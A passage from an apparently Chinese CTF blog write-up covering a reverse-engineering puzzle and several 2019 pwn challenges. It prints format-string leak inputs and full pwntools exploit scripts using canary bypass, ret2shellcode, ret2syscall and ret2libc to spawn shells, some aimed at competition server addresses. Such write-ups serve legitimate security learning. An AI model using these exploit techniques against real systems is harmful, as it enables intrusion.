class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v18);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;((__int64)&amp;v16, (__int64)&amp;v13) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;((__int64)&amp;v17);</span><br><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end((__int64)&amp;v14);</span><br><span class="line">v7 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line"><span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v7);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v6, v10);</span><br></pre></td></tr></table></figure><p>整个流程大概就是先创建几个空的vector容器，然后一个容器存放输入的16个数字，然后一个容器存放斐波那契数列，用transform将除了第一个元素外的每一个元素加上第一个元素的值，然后都赋值给一个新的vector容器，之后用accumulate将函数倒序赋值给V19（这一步我看不懂，accumulate是用来计算累加值的，但是这里只用了v19一个参数就实现了倒序，这里纯粹看堆内数据才看出来是倒序），然后让v16=v19，最后比较V16和V13，v13就是斐波那契数列，如果相等就通过，不相等就不通过。<br>精简后的过程就是：输入16个数字，后面十五个数字都加上第一个数字，然后整个数列颠倒，最后和斐波那契数列比较。<br>由此构造需要输入的数组：<br>987<br>-377<br>-610<br>-754<br>-843<br>-898<br>-932<br>-953<br>-966<br>-974<br>-979<br>-982<br>-984<br>-985<br>-986<br>-986<br>就是颠倒的斐波那契数列，除第一个元素外，其它元素都要减去第一个元素。最后得到Your flag is:flag{987-377-843-953-979-985}</p><h2 id="2019西湖论剑杯-pwn-store"><a href="#2019西湖论剑杯-pwn-store" class="headerlink" title="2019西湖论剑杯-pwn-store"></a>2019西湖论剑杯-pwn-store</h2><p>基本格式化任意地址泄露和基本rop<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST20_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = sub_400915();</span><br><span class="line">  v4 = sub_4009A0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you for you share!!"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是main函数，一开始被两个没有置NULL的free迷惑，以为是use after free，赛后经别人提醒才发现是格式化漏洞，当初没好好学，记成了printf里变量没有&amp;才是格式化漏洞，实际只要printf里只有变量就存在格式化漏洞，格式化漏洞的大致原理就是直接printf(&amp;s)的情况下，printf首先会检测变量内是否存在%，如果有就向后检测需要输出哪种类型的变量，比如人为构造s=”%s”，那么printf检测到%s，就会从栈内输出一个字符串类型的变量，相当于printf(“%s”,stack[0])，如果是%x或者%p就能泄露32位和64位系统的栈内值，%n$x中的n$代表偏移n个变量，由此可以实现栈内任意地址泄露。（但是0$的位置我一直没摸清楚，只能通过多泄露几个值对比栈内值得到偏移，但x32系统下一般是调用printf函数时栈内第2个位置）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400915</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Tell Your ID:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello "</span>, <span class="number">50L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);<span class="comment">//格式化漏洞</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为这一题开了canary，所以需要泄露canary的值，然后在栈溢出的时候用已知的canary值覆盖就能绕过检测了，同一个进程内栈的canary都是相同的。<br>这里我先通过输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0$p%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p</span><br></pre></td></tr></table></figure></p><p>确认printf参数在栈内的起始位置<br><img src="/images/2019-4-17/2019-4-17-2025.png" alt="avatar"><br><img src="/images/2019-4-17/2019-4-17-2026.png" alt="avatar"><br>可以看到<code>%7$p</code>对应的是0x7fffffffe078的0x603260<br>相应的<code>%15$p</code>和<code>%23$p</code>就是canary的值，<code>%25$p</code>就是start+231的地址。<br>知道了canary的值和start+231的址，在之后的栈溢出中就是构造payload了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_4009A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Tell me the size of your story:"</span>);</span><br><span class="line">  v1 = sub_400A54();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = -v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    v1 = <span class="number">1024L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can speak your story:"</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, v1);</span><br><span class="line">  <span class="keyword">return</span> strdup(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到s离rbp只有0x90，而v1是可以等于任意大小的，非常简单的栈溢出，我决定返回system，在失败了几次后我才想起来这是x64系统，函数的参数传递不再是用栈，而是用寄存器。</p><p>X64参数传递：<br>当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, offset aYouCanSpeakYou ; <span class="string">"You can speak your story:"</span></span><br><span class="line">call    <span class="built_in">puts</span></span><br><span class="line">mov     rdx, [rbp+var_A0]</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rsi, rdx</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    sub_400ABE</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    strdup</span><br><span class="line">mov     [rbp+var_98], rax</span><br><span class="line">mov     rax, [rbp+var_98]</span><br><span class="line">mov     rcx, [rbp+var_8]</span><br><span class="line">xor     rcx, fs:<span class="number">28</span>h</span><br><span class="line">jz      <span class="keyword">short</span> locret_400A52</span><br><span class="line">call    __stack_chk_fail</span><br></pre></td></tr></table></figure></p><p>通过阅读结尾的汇编，发现最后会把字符串s存进rax，然后mov rdi,rax。所以我们在输入s时需要先输入”/bin/sh\x00”<br>最后脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=process(<span class="string">'./story'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"%15$p%25$p"</span>)</span><br><span class="line">a=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">b=s.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">c=s.recvuntil(<span class="string">"b17"</span>)<span class="comment">#因为程序引用的libc不变的话，低12位是不会变的，也就是start+231的结尾12个bit是固定的，在我的kali系统是固定b17，也可以根据这一点在https://libc.blukat.me/查看相应libc的版本</span></span><br><span class="line">gdb.attach(s)</span><br><span class="line">carry=int(b[<span class="number">0</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">start_addr=int(c,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print(libc.symbols[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">base_addr=start_addr<span class="number">-231</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">system_addr=base_addr+libc.symbols[<span class="string">'__libc_system'</span>]</span><br><span class="line">bin_addr=base_addr+<span class="number">0x17f573</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"/bin/sh\x00"</span>+<span class="string">'\x00'</span>*<span class="number">8</span>+<span class="string">'a'</span>*<span class="number">0x78</span>+p64(carry)+<span class="string">'a'</span>*<span class="number">8</span>+p64(system_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Tell me the size of your story:"</span>,<span class="string">"-10000"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"You can speak your story:"</span>,payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="2019嘉韦思杯final-pwn-Bin"><a href="#2019嘉韦思杯final-pwn-Bin" class="headerlink" title="2019嘉韦思杯final-pwn-Bin"></a>2019嘉韦思杯final-pwn-Bin</h2><p>两题pwn只做出来了这一题基本的ret2shellcode，第二题的tcache之前没学过，这次比赛也让我意识到自己总是在重复做一些基本的堆栈溢出，能力已经很久没有提升了，而且密码学自己学了des后就停滞了，这次遇到了简单的AES却没能做出来，决定开始少参加比赛，多潜心学习，而不是继续浪费时间在那些简单题目上了。</p><p>这题唯一的难点在要注意到hint<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to exploit train"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"see you~~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序很简单，溢出buf就好了，而且什么保护都没开，直接shellcode就行了，但是因为不知道栈内地址，所以没办法返回shell code的起始地址，然后看到了之前忽略的放在main函数之前的hint函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:080484ED hint            proc near</span><br><span class="line">.text:080484ED ; __unwind &#123;</span><br><span class="line">.text:080484ED                 push    ebp</span><br><span class="line">.text:080484EE                 mov     ebp, esp</span><br><span class="line">.text:080484F0                 jmp     esp</span><br><span class="line">.text:080484F0 hint            endp</span><br><span class="line">.text:080484F0</span><br></pre></td></tr></table></figure></p><p>然后就明白了，利用这个函数，就可以让程序返回到栈顶（esp）<br>构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">'172.20.3.35'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process('./Bin')</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"><span class="comment">#buf2_addr = 0x0804853b</span></span><br><span class="line">hin_addr=<span class="number">0x080484ed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">"a"</span>*<span class="number">108</span>+shellcode[<span class="number">0</span>:<span class="number">4</span>] + p32(hin_addr)+shellcode[<span class="number">4</span>:])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="DDCTF-pwn-xpwn"><a href="#DDCTF-pwn-xpwn" class="headerlink" title="DDCTF-pwn-xpwn"></a>DDCTF-pwn-xpwn</h2><p>保护就开了NX栈不可执行，那就用ret2syscall<br>这题唯一比较有意思的是ret前的汇编跟别的题目稍微有点不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class="line">.text:0804873D                 pop     ecx</span><br><span class="line">.text:0804873E                 pop     ebx</span><br><span class="line">.text:0804873F                 pop     ebp</span><br><span class="line">.text:08048740                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048743                 retn</span><br></pre></td></tr></table></figure></p><p>这是main函数的结尾，可以看到先是esp=[ebp-8],接着pop ecx，然后esp=[ecx-4]，也相当于ret前栈顶的值变成了[[ebp-8]-4]的值，所以我们要在ebp-0x8的位置填上ropchain_addr+4，这样栈顶会变成ropchain_addr+4的地址，然后被pop给ecx，最后再esp=[ecx-4]=[ropchain_addr+4-4]=[ropchain_addr]，而地址ropchain_addr内就存放着exa_popret_addr的地址值，成功执行rop链。<br>解决了返回值的问题，还有一点就是如何泄露栈内的值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);<span class="comment">//存在read栈泄露</span></span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )<span class="comment">//因为这里进行判断时nbyte是int型，而read读取时却是把它当作无符号的size_t，所以可以取负值造成栈溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);<span class="comment">//存在栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看题目，存在栈溢出，sub_80485DB内可以泄露栈内值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的read不会在字符串末尾自动加上\x00，所以fprintf输出buf时会把栈内值都一起读出来，遇到\x00才终止，经过几次调试，会发现40个字符后会泄露ebp和setbuf+21的地址值，这样一来就获得了栈地址，也能通过setbuf+21的地址值计算出libc的基址了<br><img src="/images/2019-4-17/2019-4-17-2153.png" alt="avatar"></p><p>最后构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line">offset=<span class="number">0x65465</span></span><br><span class="line">s=remote(<span class="string">"116.85.48.105"</span>,<span class="number">5005</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line">bin_offset=<span class="number">0x15902b</span></span><br><span class="line">eax_offset=<span class="number">0x00023f97</span></span><br><span class="line">ebx_edx_offset=<span class="number">0xf1cba</span></span><br><span class="line">ecx_offset=<span class="number">0xb4047</span></span><br><span class="line">int80_offset=<span class="number">0x00002c87</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line"></span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">eax_addr=base_addr+eax_offset</span><br><span class="line">ebx_edx_addr=base_addr+ebx_edx_offset</span><br><span class="line">ecx_addr=base_addr+ecx_offset</span><br><span class="line">int80_addr=base_addr+int80_offset</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-10"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(eax_addr)+p32(<span class="number">0xb</span>)+p32(ebx_edx_addr)+p32(bin_addr)+p32(<span class="number">0</span>)+p32(ecx_addr)+p32(<span class="number">0</span>)+p32(int80_addr))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><p>后来觉得rop链太长了，ret2libc也行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">offset=<span class="number">453205</span></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">s=process(<span class="string">"./xpwn"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#local-rop</span></span><br><span class="line">system_offset=<span class="number">0x3d870</span></span><br><span class="line">bin_offset=<span class="number">0x0017c968</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">eax_offset=0x000255c7</span></span><br><span class="line"><span class="string">ebx_offset=0x00019705</span></span><br><span class="line"><span class="string">ecx_edx_offset=0x0002de3b</span></span><br><span class="line"><span class="string">int80_offset=0x0002e185</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">system_addr=base_addr+system_offset</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xb</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-1"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,payload)</span><br><span 